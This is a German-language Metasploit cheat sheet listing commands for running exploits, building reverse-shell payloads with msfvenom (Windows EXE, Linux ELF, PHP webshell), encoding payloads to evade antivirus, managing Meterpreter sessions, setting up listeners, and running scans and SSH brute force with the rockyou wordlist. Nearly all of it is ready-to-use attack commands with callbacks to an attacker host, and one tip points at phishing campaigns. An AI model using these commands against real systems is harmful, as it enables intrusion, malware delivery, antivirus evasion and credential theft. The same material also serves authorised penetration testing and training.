Exploit ausführen
Ziel und Listener konfigurieren
set RHOSTS 192.168.1.100 set RHOST 192.168.1.100 # Einzel-Ziel set LHOST 10.10.14.1 set LPORT 4444
Payload setzen
set PAYLOAD windows/x64/meterpreter/reverse_tcp
Exploit-Ziel auswählen
show targets set TARGET 0
Prüfen ob Ziel verwundbar ist
check
Exploit starten
run exploit # Alias für run run -j # als Job im Hintergrund
Tipp: RHOSTS akzeptiert CIDR-Ranges (192.168.1.0/24), Dateilisten (file:/tmp/hosts.txt) und Bereiche (192.168.1.1-50).

Payloads & msfvenom
Alle Payloads auflisten
msfvenom -l payloads msfvenom -l payloads | grep windows
Windows Reverse-TCP Meterpreter (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -f exe -o shell.exe
Linux Reverse Shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -f elf -o shell.elf
PHP Webshell
msfvenom -p php/meterpreter_reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -f raw -o shell.php
Encoder verwenden (Antivirus-Umgehung)
msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -e x64/xor_dynamic -i 5 \ -f exe -o encoded.exe
Staged vs. Stageless
# Staged (benötigt Handler): windows/x64/meterpreter/reverse_tcp # Stageless (alles in einer Datei): windows/x64/meterpreter_reverse_tcp
Payload-Optionen anzeigen
msfvenom -p windows/x64/meterpreter/reverse_tcp \ --list-options
Staged (/-Trennung): kleiner Stub lädt Stage 2 vom Handler nach. Stageless (_): vollständiger Payload in einer Datei — kein Handler nötig für die Lieferung.

Sessions
Alle aktiven Sessions anzeigen
sessions -l sessions -v # ausführlich
Session öffnen / interagieren
sessions -i 1
Session in den Hintergrund legen
# In einer Meterpreter-Session: background # Tastenkombination: Ctrl+Z
Session beenden / alle beenden
sessions -k 1 sessions -K # alle Sessions beenden
Shell-Session auf Meterpreter upgraden
sessions -u 1
Befehl in Session ausführen (ohne Interaktion)
sessions -C sysinfo -i 1
Tipp: Nach einem Upgrade mit -u wird automatisch ein multi/handler-Listener gestartet und die neue Meterpreter-Session in der Liste angezeigt.

📡
Listener einrichten
Multi-Handler laden
use exploit/multi/handler
Payload und Optionen setzen
set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.1 set LPORT 4444
Handler als Hintergrund-Job starten
run -j
Laufende Jobs anzeigen / stoppen
jobs -l jobs -k 0
Handler für mehrere Verbindungen konfigurieren
set ExitOnSession false run -j
ExitOnSession false lässt den Handler aktiv, sodass mehrere Verbindungen vom selben Payload akzeptiert werden — wichtig bei Phishing-Kampagnen.

Auxiliary Module
SMB-Scanner
use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS 192.168.1.0/24 set THREADS 10 run
Port-Scanner
use auxiliary/scanner/portscan/tcp set RHOSTS 192.168.1.0/24 set PORTS 22,80,443,8080 run
SSH-Bruteforce
use auxiliary/scanner/ssh/ssh_login set RHOSTS 192.168.1.100 set USER_FILE /usr/share/wordlists/users.txt set PASS_FILE /usr/share/wordlists/rockyou.txt run
HTTP-Version ermitteln
use auxiliary/scanner/http/http_version set RHOSTS 192.168.1.0/24 run
THREADS für schnelleres Scannen
set THREADS 50
Tipp: Auxiliary-Module haben kein Payload — sie erzeugen keine Session, sondern sammeln Informationen oder testen Konfigurationen.
